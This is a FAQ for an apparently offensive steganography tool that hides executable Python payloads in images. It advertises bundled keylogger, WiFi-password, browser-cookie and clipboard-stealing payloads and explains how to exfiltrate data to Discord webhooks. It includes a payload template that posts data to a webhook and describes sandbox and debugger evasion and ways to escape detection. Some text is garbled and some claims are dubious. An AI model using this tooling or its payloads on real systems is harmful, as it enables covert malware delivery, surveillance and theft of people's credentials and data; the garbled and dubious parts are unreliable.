# ❓ Frequently Asked Questions (FAQ)

## 📚 Table of Contents

- [General Questions](#-general-questions)
- [Installation & Setup](#-installation--setup)
- [Usage & Features](#-usage--features)
- [Security & Encryption](#-security--encryption)
- [Troubleshooting](#-troubleshooting)
- [Performance & Optimization](#-performance--optimization)
- [Advanced Topics](#-advanced-topics)
- [Legal & Ethical](#-legal--ethical)

---

## 🌐 General Questions

### What is EchoDead?

**EchoDead** is the most advanced ECHODEAD for hiding executable Python code inside images. It features military-grade AES-128 encryption, automatic compression, beautiful CLI interface, and Discord webhook exfiltration.

### How does it work?

EchoDead uses **LSB (Least Significant Bit)** Steganography to hide data in the RGB color channels of image pixels. Each pixel can store 3 bits (1 per R, G, B channel) by modifying the least significant bit, which is imperceptible to the human eye.

**Example:**
```
Original pixel: RGB(142, 87, 201) = Binary(10001110, 01010111, 11001001)
Modified pixel: RGB(143, 86, 200) = Binary(10001111, 01010110, 11001000)
                                              ↑         ↑         ↑
                                           Changed LSBs (invisible)
```

### Is it detectable?

**Visual Detection:** No. LSB changes are imperceptible (<0.4% pixel change).

**Statistical Detection:** Possible with steganalysis tools, but:
- ✅ Encryption makes content analysis impossible
- ✅ Compression randomizes bit patterns
- ✅ Anti-analysis features evade sandboxes

**Best Practice:** Use realistic cover images (photos, screenshots) to blend in.

### What makes EchoDead different from other tools?

| Feature | Others | EchoDead |
|---------|--------|---------|
| Encryption | Basic or none | AES-128 + PBKDF2 |
| Compression | Manual | Automatic (30-70%) |
| CLI | Plain text | Colored + Progress bars |
| Payloads | None | 11 ready-to-use |
| Exfiltration | Manual | Discord webhooks |
| Anti-Analysis | None | Multiple techniques |

See [COMPARISON.md](COMPARISON.md) for detailed analysis.

### Is it free?

Yes! **100% free and open-source** under MIT license.

---

## 💾 Installation & Setup

### What are the system requirements?

- **OS:** Windows, macOS, or Linux
- **Python:** 3.8 or higher
- **RAM:** 100MB minimum
- **Disk:** 50MB for dependencies

### How do I install it?

```bash
# Quick install
pip install -r requirements.txt

# Verify
python src/main.py help
```

**Dependencies installed:**
- Pillow (8MB) - Image processing
- colorama (25KB) - Colored output
- cryptography (3MB) - AES encryption

### Installation failed with "command not found"

**Problem:** Python not in PATH

**Solution:**
```bash
# Windows
py -m pip install -r requirements.txt

# macOS/Linux
python3 -m pip install -r requirements.txt
```

### Do I need special permissions?

**For basic use:** No admin/root required

**For some payloads:**
- WiFi grabber: Admin on Windows
- Keylogger: Accessibility permissions on macOS
- Browser data: Read access to browser profiles

### Can I use it without internet?

**Yes!** Once dependencies are installed:
- ✅ Embedding works offline
- ✅ Extraction works offline
- ✅ Encryption works offline
- ❌ Discord exfiltration requires internet

---

## 🚀 Usage & Features

### How do I embed a payload?

**Interactive mode (easiest):**
```bash
python src/main.py
# Select option 2: Embed Payload
```

**Command-line:**
```bash
python src/main.py embed cover.png payload.py output.png
```

**With encryption:**
```bash
python src/main.py embed cover.png payload.py output.png --password secret123
```

### How do I extract a payload?

```bash
# Basic extraction
python src/main.py extract stego_image.png extracted.py

# With decryption
python src/main.py extract stego_image.png extracted.py --password secret123
```

**Auto-detection:** EchoDead automatically detects compression/encryption and handles it!

### What's the maximum payload size?

```
Maximum bytes = (Image Width × Image Height × 3) / 8
```

**Examples:**
- 800×600 image → 180 KB maximum
- 1920×1080 image → 777 KB maximum
- 3840×2160 (4K) → 3.1 MB maximum

**Pro tip:** Enable compression to fit larger payloads:
```bash
python src/main.py config set use_compression true
```

### Can I use any image format?

**Supported:**
- ✅ PNG (lossless - best)
- ✅ BMP (lossless - large)
- ✅ TIFF (lossless)

**Not recommended:**
- ❌ JPEG (lossy compression destroys data)
- ❌ GIF (limited color palette)
- ❌ WEBP (lossy variants)

**Always use PNG for maximum compatibility and reliability.**

### How do I manage payloads?

```bash
# Add to library
python src/main.py payload add my_script.py

# List all payloads
python src/main.py payload list

# View payload code
python src/main.py payload view wifi_grabber

# Delete from library
# Use interactive mode: python src/main.py → Option 4
```

### What are the 11 ready-to-use payloads?

1. **hello_world** - Test payload
2. **system_info** - OS, CPU, RAM info
3. **network_scan** - ICMP ping sweep
4. **wifi_grabber** - WiFi passwords (Windows)
5. **screenshot** - Screen capture
6. **file_finder** - Sensitive file search
7. **clipboard_monitor** - Clipboard logging
8. **keylogger** - Keystroke recording
9. **browser_data** - Browser history/cookies
10. **process_monitor** - Running processes
11. **all_in_one** - Combined reconnaissance

See [PAYLOAD_GUIDE.md](PAYLOAD_GUIDE.md) for details.

### How do I set up Discord exfiltration?

1. **Create webhook:**
   - Discord Server Settings → Integrations → Webhooks
   - Click "New Webhook"
   - Copy webhook URL

2. **Configure:**
   ```bash
   # Edit example_payloads/webhook_utils.py
   WEBHOOK_URL = "https://discord.com/api/webhooks/YOUR_ID/YOUR_TOKEN"
   ```

3. **Test:**
   ```bash
   python example_payloads/webhook_utils.py
   ```

4. **Use:**
   ```bash
   python src/main.py workflow image.png wifi_grabber output.png --run
   ```

---

## 🔐 Security & Encryption

### Is the encryption strong?

**Yes!** EchoDead uses industry-standard encryption:

```
Algorithm:        AES-128-CBC
Authentication:   HMAC-SHA256
Key Derivation:   PBKDF2 (100,000 iterations)
Salt:             16-byte random
Key Size:         256-bit (128-bit AES + 128-bit HMAC)
```

This is the same encryption used by:
- WhatsApp end-to-end encryption
- LastPass password vault
- AWS KMS encryption

### How long would it take to crack?

**With PBKDF2 (100,000 iterations):**

| Password Strength | Time to Crack |
|-------------------|---------------|
| 8 chars (lowercase+numbers) | ~790 years |
| 10 chars (mixed) | ~47,000 years |
| 12 chars (mixed+symbols) | >1 million years |

**Without PBKDF2 (e.g., Steghide):**
- Same 8-char password: **~5.6 hours**

**Recommendation:** Use 12+ character passwords with mixed case, numbers, and symbols.

### Can someone detect encryption?

**File Inspection:** No encryption headers/signatures visible. Encrypted data looks random, indistinguishable from compressed data.

**Statistical Analysis:** Encrypted data has high entropy, but so does compressed data and random noise. Without knowing it's encrypted, analysts can't determine password strength.

**Best Practice:** Use both encryption and compression for maximum obfuscation:
```bash
python src/main.py config set use_compression true
python src/main.py config set encryption_enabled true
```

### What is stealth mode?

Stealth mode enables **anti-analysis features:**
- ✅ Sandbox detection (VM identification)
- ✅ Debugger detection (debugging tool identification)
- ✅ Timing delays (evade automated analysis)
- ✅ Metadata stripping (remove identifying info)

**Enable:**
```bash
python src/main.py config set stealth_mode true
```

### Should I use compression?

**Yes!** Compression provides multiple benefits:

1. **Size Reduction:** 30-70% smaller payloads
2. **Faster Embedding:** Less data to hide
3. **Larger Payloads:** Fit more in smaller images
4. **Obfuscation:** Compressed data looks random

**No downsides** - it's automatic, fast (<50ms), and enables by default.

### Can I use my own encryption?

Yes! EchoDead is modular:

1. **Encrypt your payload separately**
2. **Embed the encrypted file**
3. **Skip EchoDead encryption:**
   ```bash
   python src/main.py embed image.png encrypted_payload.bin output.png --no-compress
   ```

---

## 🔧 Troubleshooting

### "Image too small" error

**Problem:** Payload exceeds image capacity

**Solution:**
```bash
# Check capacity
Width × Height × 3 / 8 = Maximum bytes

# Options:
1. Use larger image
2. Enable compression (30-70% reduction)
3. Reduce payload size
```

**Example:**
```bash
# Enable compression
python src/main.py config set use_compression true

# Now retry
python src/main.py embed small_image.png large_payload.py output.png
```

### "Wrong password" error

**Problem:** Password mismatch during extraction

**Solution:**
- ✅ Use exact same password (case-sensitive)
- ✅ Check for typos
- ✅ Verify keyboard layout (e.g., US vs. UK)
- ✅ Avoid special characters that might not display correctly

**Debug:**
```bash
# Test with simple password
python src/main.py embed test.png hello.py out.png --password test123
python src/main.py extract out.png extracted.py --password test123
```

### "Module not found" errors

**Problem:** Dependencies not installed

**Solution:**
```bash
# Core dependencies
pip install -r requirements.txt

# Optional dependencies
pip install pynput    # Keylogger
pip install pywin32   # Clipboard monitor (Windows)
pip install psutil    # Process monitor
```

### Extracted payload is corrupted

**Causes:**
1. ❌ Used JPEG (lossy compression)
2. ❌ Image was resized/edited after embedding
3. ❌ Wrong password for encrypted payload
4. ❌ Original image was corrupted

**Prevention:**
- ✅ Always use PNG format
- ✅ Never edit stego images
- ✅ Verify extraction immediately after embedding
- ✅ Use the workflow command to test end-to-end

**Test:**
```bash
python src/main.py workflow test.png hello.py output.png --run
# If this works, your setup is correct
```

### Discord webhook not working

**Common issues:**

1. **Invalid webhook URL**
   ```bash
   # Must be exact format:
   https://discord.com/api/webhooks/WEBHOOK_ID/WEBHOOK_TOKEN
   ```

2. **Rate limiting**
   - Discord: Max 30 requests/minute per webhook
   - Solution: Add delays between sends

3. **Firewall blocking**
   - Test: `curl -X POST <webhook_url>`
   - If fails, check firewall/proxy

4. **Webhook deleted**
   - Check Discord server → Integrations → Webhooks
   - Recreate if deleted

**Test webhook:**
```bash
python example_payloads/webhook_utils.py
```

### Colors not showing in terminal

**Problem:** Old terminal or Windows < 10

**Solution:**
```bash
# Install colorama (should fix automatically)
pip install colorama

# If still issues, colors will fallback to plain text automatically
```

---

## ⚡ Performance & Optimization

### How can I make it faster?

**Disable compression (faster, but larger):**
```bash
python src/main.py embed image.png payload.py output.png --no-compress
```

**Use smaller images:**
- Embedding speed: Linear with image size
- 800×600 is 4x faster than 1920×1080

**Use SSD storage:**
- I/O is the bottleneck for large images

### Why is embedding slow on large images?

**LSB embedding requires:**
1. Reading every pixel (width × height)
2. Bit manipulation (3 operations per pixel)
3. Writing every pixel

**4K image (3840×2160):**
- 8.3 million pixels
- 24.9 million bit operations
- Takes ~18 seconds on typical hardware

**Optimization:** Use appropriate image size for payload. Don't use 4K image for 1KB payload.

### Can I process multiple images at once?

**Sequential (built-in):**
```bash
python src/main.py embed img1.png payload.py out1.png
python src/main.py embed img2.png payload.py out2.png
```

**Parallel (custom script):**
```python
import concurrent.futures
import subprocess

images = ['img1.png', 'img2.png', 'img3.png']

def embed(img):
    subprocess.run(['python', 'src/main.py', 'embed', img, 'payload.py', f'out_{img}'])

with concurrent.futures.ProcessPoolExecutor(max_workers=4) as executor:
    executor.map(embed, images)
```

### Does compression slow it down?

**Barely!** Compression is fast:

| Payload Size | Compression Time |
|--------------|------------------|
| 1 KB | 2ms |
| 10 KB | 12ms |
| 100 KB | 95ms |
| 1 MB | 850ms |

**Benefit:** 30-70% size reduction enables faster embedding overall.

---

## 🎓 Advanced Topics

### Can I embed non-Python payloads?

**Yes!** EchoDead embeds binary data:

```bash
# Embed any file type
python src/main.py embed image.png document.pdf output.png
python src/main.py embed image.png program.exe output.png
python src/main.py embed image.png archive.zip output.png

# Extract
python src/main.py extract output.png extracted_file
```

**Note:** The `run` command only works with Python files.

### How do I create custom payloads?

1. **Write Python script:**
   ```python
   import requests
   
   # Your payload code
   data = "Sensitive data"
   
   # Send to webhook
   webhook_url = "YOUR_WEBHOOK_HERE"
   requests.post(webhook_url, json={"content": data})
   ```

2. **Test locally:**
   ```bash
   python my_payload.py
   ```

3. **Add to library:**
   ```bash
   python src/main.py payload add my_payload.py
   ```

4. **Use in workflow:**
   ```bash
   python src/main.py workflow image.png my_payload output.png --run
   ```

### Can I integrate this into my own Python scripts?

**Yes!** Use as a library:

```python
from src.main import embed_code_in_image, extract_code_from_image

# Embed
embed_code_in_image(
    image_path='cover.png',
    code_path='payload.py',
    output_image_path='stego.png',
    password='secret123',
    compress=True
)

# Extract
extract_code_from_image(
    image_path='stego.png',
    output_code_path='extracted.py',
    password='secret123'
)
```

### How does anti-analysis work?

**Sandbox Detection:**
```python
# Checks for VM indicators
- VMware, VirtualBox, QEMU processes
- Low RAM (<4GB)
- Low CPU cores (<2)
- VM-specific registry keys (Windows)
- VM-specific files (/proc/scsi/scsi on Linux)
```

**Debugger Detection:**
```python
# Checks for debugging tools
- x64dbg, WinDbg, IDA, gdb processes
- IsDebuggerPresent() (Windows)
- ptrace detection (Linux)
```

**Enable:**
```bash
python src/main.py config set stealth_ true
```

### Can I use this for legitimate purposes?

**Absolutely!** Legitimate uses:

1. **Watermarking:** Hide copyright info in images
2. **Data Backup:** Store encrypted backups in photos
3. **Secure Messaging:** Send messages hidden in images
4. **Authentication:** Embed verification data
5. **Research:** Study Steganography techniques

**Always obtain proper authorization before use.**

---

## ⚖️ Legal & Ethical

### Is Steganography legal?

**Yes** in most countries for legitimate purposes:
- ✅ Personal privacy
- ✅ Digital watermarking
- ✅ Secure communication
- ✅ Research & education

**Illegal uses:**
- ❌ Unauthorized access to systems
- ❌ Distribution of malware
- ❌ Privacy violations
- ❌ Illegal content distribution

**Always:** Obtain proper authorization and comply with local laws.

### What are the ethical considerations?

1. **Authorization:** Only use on systems you own or have permission to access
2. **Transparency:** Disclose Steganography use when required
3. **Harm Prevention:** Don't use for malicious purposes
4. **Privacy:** Respect others' privacy rights
5. **Responsibility:** You are responsible for how you use this tool

### Can this be used for red teaming?

**Yes!** EchoDead is excellent for **authorized** red team operations:

- ✅ Data exfiltration testing
- ✅ Payload delivery testing
- ✅ Detection evasion testing
- ✅ Security awareness training

**Requirements:**
- ✅ Written authorization from client
- ✅ Defined scope and rules of engagement
- ✅ Professional liability insurance
- ✅ Incident response plan

### What should I include in my authorization?

**Minimum required:**
1. Client name and signature
2. Scope (systems, IP ranges, domains)
3. Testing period (start/end dates)
4. Permitted activities
5. Contact information
6. Emergency procedures

**Get legal advice** - requirements vary by jurisdiction.

### How can I use this responsibly?

**Best practices:**

1. **Education First:** Learn Steganography concepts
2. **Test Safely:** Use isolated environments
3. **Get Authorization:** Always obtain written permission
4. **Document Everything:** Maintain detailed logs
5. **Report Findings:** Responsibly disclose vulnerabilities
6. **Stay Updated:** Follow security research ethics
7. **Give Back:** Contribute improvements to community

---

## 💬 Still Have Questions?

### 📧 Contact & Support

- **GitHub Issues:** [Report bugs/request features](https://github.com/yourusername/EchoDead/issues)
- **Documentation:** [Read all guides](README.md)
- **Comparison:** [vs. other tools](COMPARISON.md)

### 📚 Additional Resources

- [Quick Start Guide](QUICKSTART.md)
- [Feature Documentation](FEATURES.md)
- [Payload Guide](PAYLOAD_GUIDE.md)
- [What's New in v2.0](WHATS_NEW.md)

### 🤝 Contributing

Found a bug? Have a feature idea? Contributions welcome!

```bash
# Fork → Create Feature Branch → Submit PR
git checkout -b feature/amazing-feature
```

---

**Thanks for using EchoDead! 🚀**

*The most sophisticated ECHODEAD ever built.*
